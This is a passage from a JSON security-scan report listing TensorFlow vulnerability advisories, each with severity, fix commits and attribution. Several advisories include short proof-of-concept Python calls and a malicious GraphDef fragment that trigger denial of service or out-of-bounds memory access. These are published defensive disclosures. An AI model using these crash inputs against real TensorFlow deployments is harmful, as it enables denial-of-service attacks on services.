                "text": "Vulnerability CVE-2022-21732\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-21732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21732)\n### Impact \nThe [implementation of `ThreadPoolHandle`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/data/experimental/threadpool_dataset_op.cc#L79-L135) can be used to trigger a denial of service attack by allocating too much memory:\n\n```python\nimport tensorflow as tf\ny = tf.raw_ops.ThreadPoolHandle(num_threads=0x60000000,display_name=`tf`)\n```\n\nThis is because the `num_threads` argument is only checked to not be negative, but there is no upper bound on its value.\n    \n### Patches\nWe have patched the issue in GitHub commit [e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e](https://github.com/tensorflow/tensorflow/commit/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21732**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-21732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21732)|\n\n### Impact \nThe [implementation of `ThreadPoolHandle`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/data/experimental/threadpool_dataset_op.cc#L79-L135) can be used to trigger a denial of service attack by allocating too much memory:\n\n```python\nimport tensorflow as tf\ny = tf.raw_ops.ThreadPoolHandle(num_threads=0x60000000,display_name=`tf`)\n```\n\nThis is because the `num_threads` argument is only checked to not be negative, but there is no upper bound on its value.\n    \n### Patches\nWe have patched the issue in GitHub commit [e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e](https://github.com/tensorflow/tensorflow/commit/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "4.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23560",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23560"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23560",
              "help": {
                "text": "Vulnerability CVE-2022-23560\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23560](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23560)\n### Impact\nAn attacker can craft a TFLite model that would allow limited reads and writes outside of arrays in TFLite. This exploits missing validation in [the conversion from sparse tensors to dense tensors](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/kernels/internal/utils/sparsity_format_converter.cc#L252-L293).\n\n### Patches\nWe have patched the issue in GitHub commit [6364463d6f5b6254cac3d6aedf999b6a96225038](https://github.com/tensorflow/tensorflow/commit/6364463d6f5b6254cac3d6aedf999b6a96225038).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-23560**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23560](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23560)|\n\n### Impact\nAn attacker can craft a TFLite model that would allow limited reads and writes outside of arrays in TFLite. This exploits missing validation in [the conversion from sparse tensors to dense tensors](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/kernels/internal/utils/sparsity_format_converter.cc#L252-L293).\n\n### Patches\nWe have patched the issue in GitHub commit [6364463d6f5b6254cac3d6aedf999b6a96225038](https://github.com/tensorflow/tensorflow/commit/6364463d6f5b6254cac3d6aedf999b6a96225038).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21725",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21725"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21725",
              "help": {
                "text": "Vulnerability CVE-2022-21725\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-21725](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21725)\n### Impact \nThe [estimator for the cost of some convolution operations](https://github.com/tensorflow/tensorflow/blob/ffa202a17ab7a4a10182b746d230ea66f021fe16/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L189-L198) can be made to execute a division by 0:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y=tf.raw_ops.AvgPoolGrad(\n    orig_input_shape=[1,1,1,1],\n    grad=[[[[1.0],[1.0],[1.0]]],[[[2.0],[2.0],[2.0]]],[[[3.0],[3.0],[3.0]]]],\n    ksize=[1,1,1,1],\n    strides=[1,1,1,0],\n    padding=`VALID`,\n    data_format=`NCHW`)\n  return y\n\ntest()\n```\n\nThe function fails to check that the stride argument is stricly positive:\n\n```cc\nint64_t GetOutputSize(const int64_t input, const int64_t filter,\n                      const int64_t stride, const Padding\u0026 padding) {\n  // Logic for calculating output shape is from GetWindowedOutputSizeVerbose() \n  // function in third_party/tensorflow/core/framework/common_shape_fns.cc.\n  if (padding == Padding::VALID) {\n    return (input - filter + stride) / stride;\n  } else {  // SAME.\n    return (input + stride - 1) / stride;\n  }\n} \n```\n\nHence, the fix is to add a check for the stride argument to ensure it is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [3218043d6d3a019756607643cf65574fbfef5d7a](https://github.com/tensorflow/tensorflow/commit/3218043d6d3a019756607643cf65574fbfef5d7a).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21725**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-21725](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21725)|\n\n### Impact \nThe [estimator for the cost of some convolution operations](https://github.com/tensorflow/tensorflow/blob/ffa202a17ab7a4a10182b746d230ea66f021fe16/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L189-L198) can be made to execute a division by 0:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y=tf.raw_ops.AvgPoolGrad(\n    orig_input_shape=[1,1,1,1],\n    grad=[[[[1.0],[1.0],[1.0]]],[[[2.0],[2.0],[2.0]]],[[[3.0],[3.0],[3.0]]]],\n    ksize=[1,1,1,1],\n    strides=[1,1,1,0],\n    padding=`VALID`,\n    data_format=`NCHW`)\n  return y\n\ntest()\n```\n\nThe function fails to check that the stride argument is stricly positive:\n\n```cc\nint64_t GetOutputSize(const int64_t input, const int64_t filter,\n                      const int64_t stride, const Padding\u0026 padding) {\n  // Logic for calculating output shape is from GetWindowedOutputSizeVerbose() \n  // function in third_party/tensorflow/core/framework/common_shape_fns.cc.\n  if (padding == Padding::VALID) {\n    return (input - filter + stride) / stride;\n  } else {  // SAME.\n    return (input + stride - 1) / stride;\n  }\n} \n```\n\nHence, the fix is to add a check for the stride argument to ensure it is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [3218043d6d3a019756607643cf65574fbfef5d7a](https://github.com/tensorflow/tensorflow/commit/3218043d6d3a019756607643cf65574fbfef5d7a).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23591",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23591"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23591",
              "help": {
                "text": "Vulnerability CVE-2022-23591\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23591)\n### Impact\nThe `GraphDef` format in TensorFlow does not allow self recursive functions. The runtime assumes that this invariant is satisfied. However, a `GraphDef` containing a fragment such as the following can be consumed when loading a `SavedModel`:\n\n```\n  library {\n    function {\n      signature {\n        name: \"SomeOp\"\n        description: \"Self recursive op\"\n      }\n      node_def {\n        name: \"1\"\n        op: \"SomeOp\"\n      }\n      node_def {\n        name: \"2\"\n        op: \"SomeOp\"\n      }\n    }\n  } \n```\n\nThis would result in a stack overflow during execution as resolving each `NodeDef` means resolving the function itself and its nodes.\n\n### Patches\nWe have patched the issue in GitHub commit [448a16182065bd08a202d9057dd8ca541e67996c](https://github.com/tensorflow/tensorflow/commit/448a16182065bd08a202d9057dd8ca541e67996c).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23591**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23591)|\n\n### Impact\nThe `GraphDef` format in TensorFlow does not allow self recursive functions. The runtime assumes that this invariant is satisfied. However, a `GraphDef` containing a fragment such as the following can be consumed when loading a `SavedModel`:\n\n```\n  library {\n    function {\n      signature {\n        name: \"SomeOp\"\n        description: \"Self recursive op\"\n      }\n      node_def {\n        name: \"1\"\n        op: \"SomeOp\"\n      }\n      node_def {\n        name: \"2\"\n        op: \"SomeOp\"\n      }\n    }\n  } \n```\n\nThis would result in a stack overflow during execution as resolving each `NodeDef` means resolving the function itself and its nodes.\n\n### Patches\nWe have patched the issue in GitHub commit [448a16182065bd08a202d9057dd8ca541e67996c](https://github.com/tensorflow/tensorflow/commit/448a16182065bd08a202d9057dd8ca541e67996c).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21729",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21729"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21729",
              "help": {
                "text": "Vulnerability CVE-2022-21729\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21729](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21729)\n### Impact \nThe [implementation of `UnravelIndex`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/unravel_index_op.cc#L36-L135) is vulnerable to a division by zero caused by an integer overflow bug:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.UnravelIndex(indices=-0x100000,dims=[0x100000,0x100000])\n```\n\n### Patches\nWe have patched the issue in GitHub commit [58b34c6c8250983948b5a781b426f6aa01fd47af](https://github.com/tensorflow/tensorflow/commit/58b34c6c8250983948b5a781b426f6aa01fd47af).\n    \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21729**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21729](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21729)|\n\n### Impact \nThe [implementation of `UnravelIndex`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/unravel_index_op.cc#L36-L135) is vulnerable to a division by zero caused by an integer overflow bug:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.UnravelIndex(indices=-0x100000,dims=[0x100000,0x100000])\n```\n\n### Patches\nWe have patched the issue in GitHub commit [58b34c6c8250983948b5a781b426f6aa01fd47af](https://github.com/tensorflow/tensorflow/commit/58b34c6c8250983948b5a781b426f6aa01fd47af).\n    \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23567",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23567"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23567",
              "help": {
                "text": "Vulnerability CVE-2022-23567\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23567](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23567)\n### Impact \nThe [implementations of `Sparse*Cwise*` ops](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc) are vulnerable to integer overflows. These can be used to trigger large allocations (so, OOM based denial of service) or `CHECK`-fails when building new `TensorShape` objects (so, assert failures based denial of service):\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices=np.array([[9]]),\n    sp_values=np.array([5]),\n    sp_shape=np.array([92233720368., 92233720368]),\n    dense=np.array([4]))\n```\n\nWe are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.\n\n### Patches\nWe have patched the issue in GitHub commits [1b54cadd19391b60b6fcccd8d076426f7221d5e8](https://github.com/tensorflow/tensorflow/commit/1b54cadd19391b60b6fcccd8d076426f7221d5e8) and [e952a89b7026b98fe8cbe626514a93ed68b7c510](https://github.com/tensorflow/tensorflow/commit/e952a89b7026b98fe8cbe626514a93ed68b7c510).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-23567**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23567](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23567)|\n\n### Impact \nThe [implementations of `Sparse*Cwise*` ops](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc) are vulnerable to integer overflows. These can be used to trigger large allocations (so, OOM based denial of service) or `CHECK`-fails when building new `TensorShape` objects (so, assert failures based denial of service):\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices=np.array([[9]]),\n    sp_values=np.array([5]),\n    sp_shape=np.array([92233720368., 92233720368]),\n    dense=np.array([4]))\n```\n\nWe are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.\n\n### Patches\nWe have patched the issue in GitHub commits [1b54cadd19391b60b6fcccd8d076426f7221d5e8](https://github.com/tensorflow/tensorflow/commit/1b54cadd19391b60b6fcccd8d076426f7221d5e8) and [e952a89b7026b98fe8cbe626514a93ed68b7c510](https://github.com/tensorflow/tensorflow/commit/e952a89b7026b98fe8cbe626514a93ed68b7c510).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "GHSA-h6gw-r52c-724r",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-h6gw-r52c-724r"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://github.com/advisories/GHSA-h6gw-r52c-724r",
              "help": {
                "text": "Vulnerability GHSA-h6gw-r52c-724r\nSeverity: critical\nFixed Version: 2.7.0\nLink: [GHSA-h6gw-r52c-724r](https://github.com/advisories/GHSA-h6gw-r52c-724r)\n### Impact \nThe [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. This allows malicious users to read and write outside of bounds of heap allocated data as well as trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures).\n\nThis follows after CVE-2021-41208 where these APIs were still vulnerable to multiple security issues.\n\n**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. \n  \nThese APIs are now deprecated in TensorFlow 2.8. We will remove TensorFlow`s boosted trees APIs in subsequent releases.\n  \n### Patches\nWe have patched the known issues in multiple GitHub commits.\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\nThis should allow users to use existing boosted trees APIs for a while until they migrate to [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests), while guaranteeing that known vulnerabilities are fixed.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThese vulnerabilities have been reported by Yu Tian of Qihoo 360 AIVul Team and Faysal Hossain Shezan from University of Virginia. Some of the issues have been discovered internally after a careful audit of the APIs.",
                "markdown": "**Vulnerability GHSA-h6gw-r52c-724r**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|2.7.0|[GHSA-h6gw-r52c-724r](https://github.com/advisories/GHSA-h6gw-r52c-724r)|\n\n### Impact \nThe [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. This allows malicious users to read and write outside of bounds of heap allocated data as well as trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures).\n\nThis follows after CVE-2021-41208 where these APIs were still vulnerable to multiple security issues.\n\n**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. \n  \nThese APIs are now deprecated in TensorFlow 2.8. We will remove TensorFlow`s boosted trees APIs in subsequent releases.\n  \n### Patches\nWe have patched the known issues in multiple GitHub commits.\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\nThis should allow users to use existing boosted trees APIs for a while until they migrate to [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests), while guaranteeing that known vulnerabilities are fixed.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThese vulnerabilities have been reported by Yu Tian of Qihoo 360 AIVul Team and Faysal Hossain Shezan from University of Virginia. Some of the issues have been discovered internally after a careful audit of the APIs."
              },
              "properties": {
                "security-severity": "9.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2022-23557",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23557"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23557",
              "help": {
                "text": "Vulnerability CVE-2022-23557\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23557](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23557)\n### Impact \nAn attacker can craft a TFLite model that would trigger a division by zero in [`BiasAndClamp` implementation](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/lite/kernels/internal/common.h#L75):\n\n```cc\ninline void BiasAndClamp(float clamp_min, float clamp_max, int bias_size,\n                         const float* bias_data, int array_size,\n                         float* array_data) {\n  // ...\n  TFLITE_DCHECK_EQ((array_size % bias_size), 0);\n  // ...\n} \n```\n  \nThere is no check that the `bias_size` is non zero.\n  \n### Patches\nWe have patched the issue in GitHub commit [8c6f391a2282684a25cbfec7687bd5d35261a209](https://github.com/tensorflow/tensorflow/commit/8c6f391a2282684a25cbfec7687bd5d35261a209).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-23557**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23557](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23557)|\n\n### Impact \nAn attacker can craft a TFLite model that would trigger a division by zero in [`BiasAndClamp` implementation](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/lite/kernels/internal/common.h#L75):\n\n```cc\ninline void BiasAndClamp(float clamp_min, float clamp_max, int bias_size,\n                         const float* bias_data, int array_size,\n                         float* array_data) {\n  // ...\n  TFLITE_DCHECK_EQ((array_size % bias_size), 0);\n  // ...\n} \n```\n  \nThere is no check that the `bias_size` is non zero.\n  \n### Patches\nWe have patched the issue in GitHub commit [8c6f391a2282684a25cbfec7687bd5d35261a209](https://github.com/tensorflow/tensorflow/commit/8c6f391a2282684a25cbfec7687bd5d35261a209).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21726",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21726"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21726",
              "help": {
                "text": "Vulnerability CVE-2022-21726\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21726](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21726)\n### Impact \nThe [implementation of `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/dequantize_op.cc#L92-L153) does not fully validate the value of `axis` and can result in heap OOB accesses:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=tf.constant([1,1],dtype=tf.qint32),\n    min_range=[1.0],\n    max_range=[10.0],\n    mode=`MIN_COMBINED`,\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\ntest()\n```\n\nThe `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked and this results in reading past the end of the array containing the dimensions of the input tensor:\n    \n```cc   \n  if (axis_ \u003e -1) {\n    num_slices = input.dim_size(axis_);\n  }\n  // ...\n  int64_t pre_dim = 1, post_dim = 1;\n  for (int i = 0; i \u003c axis_; ++i) {\n    pre_dim *= float_output.dim_size(i);\n  }\n  for (int i = axis_ + 1; i \u003c float_output.dims(); ++i) {\n    post_dim *= float_output.dim_size(i);\n  }\n``` \n      \n### Patches\nWe have patched the issue in GitHub commit [23968a8bf65b009120c43b5ebcceaf52dbc9e943](https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n      \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
